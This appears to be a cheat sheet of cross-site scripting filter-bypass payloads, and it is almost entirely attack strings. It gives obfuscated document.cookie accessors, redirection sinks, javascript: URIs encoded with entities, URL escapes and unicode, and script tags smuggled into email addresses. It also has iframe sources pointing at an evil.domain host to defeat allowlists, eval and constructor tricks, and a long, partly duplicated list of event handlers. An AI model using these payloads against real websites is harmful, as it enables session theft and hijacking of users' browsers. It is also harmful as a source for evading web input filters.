# XSS-Bypass-Filters

### Redirection
```
document.location=
document['location']=
window.location=
this["window"]["location"]=
document.location.href=
location.href=
location=
window.location.assign()
window['location']['href']=
document.location.replace()
```

### Link

```
//google.com/?=a
//134744072:1234/?a= (decimal ip)
```

### Cookies

```
document.cookie 
document['cookie']
with(document)alert(cookie)
doc\u0075ment.cookie
doc\u0075ment['cookie']
window["doc"+"ument"]["cookie"]
```

### Href

```
<!--javascript -->
ja&Tab;vascript:alert(1)
java\tscript:alert(1)
ja&NewLine;vascript:alert(1)
ja&#x0000A;vascript:alert(1)
java&#x73;cript:alert()

<!--::colon:: -->
javascript&colon;alert()
javascript&#x0003A;alert()
javascript&#58;alert(1)
javascript&#x3A;alert()

<!-- alert -->
#HTML entities/encode:
javascript:alert&lpar;&rpar;
javascript:al&#x65;rt``

#url encoding:
javascript:alert%60%60
javascript:x='%27-alert(1)-%27';
javascript:%61%6c%65%72%74%28%29

#JS unicode 
javascript:a\u006Cert``"
javascript:\u0061\u006C\u0065\u0072\u0074``
```

### Email 
```
test+(<script>alert(0)</script>)@example.com
test@example(<script>alert(0)</script>).com
"<script>alert(0)</script>"@example.com
```

### Iframe
```
<iframe src="javascript:alert('XSS')"> #use href bypass
<iframe src="https://youtube.com.evil.domain/ "> # if youtube is whitelisted for example
<iframe src="https://google.com@evil.domain">
```

### Alert
```
alert(1)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
eval('ale'+'rt(0)');
eval('ale'+'rt(0)');
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
constructor.constructor("aler"+"t(3)")();
[].filter.constructor('ale'+'rt(4)')();
top["al"+"ert"](5);
top[8680439..toString(30)](7);
top[/al/.source+/ert/.source](8);
top['al\x65rt'](9);
open('java'+'script:ale'+'rt(11)');
setTimeout`alert\u0028document.domain\u0029`;
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
```

## Events
```
onabort
oncancel
oncanplay
oncanplaythrough
onchange
onclick
onclose
oncuechange
ondblclick
ondrag
ondragend
ondragenter
ondragexit
ondragleave
ondragover
ondragstart
ondrop
ondurationchange
onemptied
onended
oninput
oninvalid
onkeydown
onkeypress
onkeyup
onloadeddata
onloadedmetadata
onloadstart
onmousedown
onmouseenter
onmouseleave
onmousemove
onmouseout
onmouseover
onmouseup
onmousewheel
onpause
onplay
onplaying
onprogress
onratechange
onreset
onseeked
onseeking
onselect
onshow
onstalled
onsubmit
onsuspend
ontimeupdate
onabort
oncancel
oncanplay
oncanplaythrough
onchange
onclick
onclose
oncuechange
ondblclick
ondrag
ondragend
ondragenter
ondragexit
ondragleave
ondragover
ondragstart
ondrop
ondurationchange
onemptied
onended
oninput
oninvalid
onkeydown
onkeypress
onkeyup
onloadeddata
onloadedmetadata
onloadstart
onmousedown
onmouseenter
onmouseleave
onmousemove
onmouseout
onmouseover
onmouseup
onmousewheel
onpause
onplay
onplaying
onprogress
onratechange
onreset
onseeked
onseeking
onselect
onshow
onstalled
onsubmit
onsuspend
ontimeupdate
onvolumechange
onwaiting
onblur
onerror
onfocus
onload
onscroll
onafterprint
onbeforeprint
onbeforeunload
onhashchange
onmessage
onoffline
ononline
onpageshow
onpopstate
onresize
onstorage
onunload
onreadystatechanges
```
